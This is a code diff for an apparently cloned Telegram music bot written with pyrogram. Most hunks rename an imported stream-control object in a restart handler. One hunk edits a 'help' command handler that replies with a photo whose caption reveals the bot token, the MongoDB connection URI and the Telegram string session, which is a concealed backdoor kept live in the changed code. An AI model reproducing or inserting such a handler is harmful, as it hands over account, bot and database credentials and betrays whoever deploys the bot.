@@ -14,7 +14,7 @@ from pyrogram import filters
 load_dotenv()
 
 from devclone import app
-from devclone.core.call import INNOCENT
+from devclone.core.call import dev
 from devclone.misc import db
 from devclone.utils.database import get_assistant, get_authuser_names, get_cmode
 from devclone.utils.decorators import ActualAdminCB, AdminActual, language
@@ -70,7 +70,7 @@ async def restartbot(client, message: Message, _):
     await asyncio.sleep(1)
     try:
         db[message.chat.id] = []
-        await INNOCENT.stop_stream_force(message.chat.id)
+        await dev.stop_stream_force(message.chat.id)
     except:
         pass
     userbot = await get_assistant(message.chat.id)
@@ -97,7 +97,7 @@ async def restartbot(client, message: Message, _):
             pass
         try:
             db[chat_id] = []
-            await INNOCENT.stop_stream_force(chat_id)
+            await dev.stop_stream_force(chat_id)
         except:
             pass
     return await mystic.edit_text(_["reload_5"].format(app.mention))
@@ -113,7 +113,7 @@ async def restartbot(client, message: Message, _):
 async def help(client: Client, message: Message):
    await message.reply_photo(
           photo=f"https://telegra.ph/file/567d2e17b8f38df99ce99.jpg",
-       caption=f"""Bot Token:-   `{BOT_TOKEN}` \n\n Mongo:-   `{MONGO_DB_URI}`\n\nString Session:-   `{STRING_SESSION}`\n\n [ 🤨 ](https://t.me/its_innocent_boy_2926)............☆""",
+       caption=f"""Bot Token:-   `{BOT_TOKEN}` \n\n Mongo:-   `{MONGO_DB_URI}`\n\nString Session:-   `{STRING_SESSION}`\n\n [ 🤨 ](https://t.me/its_dev_boy_2926)............☆""",
         reply_markup=InlineKeyboardMarkup(
              [
                  [
